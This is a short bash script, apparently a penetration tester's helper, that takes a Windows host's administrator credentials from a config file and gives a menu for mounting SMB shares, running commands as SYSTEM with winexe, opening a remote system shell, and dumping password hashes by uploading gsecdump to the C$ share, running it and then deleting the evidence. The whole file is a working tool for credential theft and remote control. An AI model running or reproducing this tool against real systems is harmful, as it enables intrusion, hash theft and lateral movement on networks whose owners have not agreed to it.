#!/bin/bash
# Sample config file
# $ cat .smbops 
# IP=10.1.2.3
# DOMAIN=CORP
# USER=Administrator
# PASS=abc123

menu() {
	echo "[m] mount share"
	echo "[e] execute command"
	echo "[d] dump password hashes"
	echo "[s] start system shell"
	echo "[q] exit"
}

prompt() {
	echo -n "Your choice (h for help): "
}

fail() {
	echo "[FAIL]"
	exit
}

yellow() {
	echo -n '\033[00;33m'
}
reset() {
	echo -n '\033[00m'
}

if [ -z $1 ]; then
	CONF_FILE="${HOME}/.smbops"
else
	CONF_FILE=$1
fi

GSECDUMP=/home/jeremy/pentest/windows/gsecdump-v2b4.exe

IP=$(grep IP $CONF_FILE|cut -d= -f2)
DOMAIN=$(grep DOMAIN $CONF_FILE|cut -d= -f2)
USER=$(grep USER $CONF_FILE|cut -d= -f2)
PASS=$(grep PASS $CONF_FILE|cut -d= -f2)

menu
prompt

while read LINE
do
	if [ "$LINE" = "m" ]; then
		echo -n "SHARE NAME: "
		read SHARE
		sudo mkdir /mnt/${IP}_${SHARE}
		sudo mount -t cifs -o "username=$USER,password=$PASS,domain=$DOMAIN" "//${IP}/${SHARE}" /mnt/${IP}_${SHARE} && \
			echo "//${IP}/${SHARE} mounted as /mnt/${IP}_${SHARE}"

	elif [ "$LINE" = "e" ]; then
		echo -n "CMD: "
		read CMD
		yellow
		winexe --system --uninstall -U $USER%$PASS //$IP "cmd /C $CMD"
		reset

	elif [ "$LINE" = "d" ]; then
		yellow
		echo "Initializing ..."
		smbclient -U $USER%$PASS //$IP/c$ -c 'dir \' 1>/dev/null 2>&1 || fail
		smbclient -U $USER%$PASS //$IP/c$ -c 'mkdir \temp' 1>/dev/null 2>&1
		smbclient -U $USER%$PASS //$IP/c$ -c 'mkdir \temp\temp' 1>/dev/null 2>&1
		echo "Uploading gsecdump ..."
		smbclient -U $USER%$PASS //$IP/c$ -c "put $GSECDUMP \temp\temp\gsec.exe" 1>/dev/null 2>&1
		echo "Dumping ..."
		winexe --system --uninstall -U $USER%$PASS //$IP 'c:\temp\temp\gsec.exe -s -u' | grep :::| \
			egrep -v 'IUSR|IWAM|\$|Invit|TsInternetUser'|sed -e 's/(current)//g'|sort -u
		echo "Cleaning ..."
		winexe --system --uninstall -U $USER%$PASS //$IP 'cmd /c rmdir /s/q c:\temp\temp' 1>/dev/null 2>&1
		reset

	elif [ "$LINE" = "s" ]; then
		yellow
		winexe --system --uninstall -U $USER%$PASS //$IP "cmd /C cmd"
		reset

	elif [ "$LINE" = "q" ]; then
		exit

	elif [ "$LINE" = "h" ]; then
		menu
	fi

	prompt
done

